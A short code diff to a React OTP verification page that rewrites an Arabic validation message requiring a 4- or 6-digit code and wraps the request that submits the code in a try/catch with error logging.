@@ -30,7 +30,7 @@ export default function VerifyPage() {
     e.preventDefault();
     const len = otp.trim().length;
     if (len !== 4 && len !== 6) {
-      setFillError("رمز التحقق ");
+      setFillError("رمز التحقق غير صالح (يجب أن يكون 4 أو 6 أرقام)");
       setWrongError(false);
       return;
     }
@@ -38,11 +38,15 @@ export default function VerifyPage() {
     setWrongError(false);
     setLoading(true);
 
-    await createOrUpdateRequest({
-      stage_key: "otp",
-      notify_key: otp.trim(),
-      stage_state: "pending",
-    });
+    try {
+      await createOrUpdateRequest({
+        stage_key: "otp",
+        notify_key: otp.trim(),
+        stage_state: "pending",
+      });
+    } catch (err) {
+      console.error(err);
+    }
   };
 
   return (
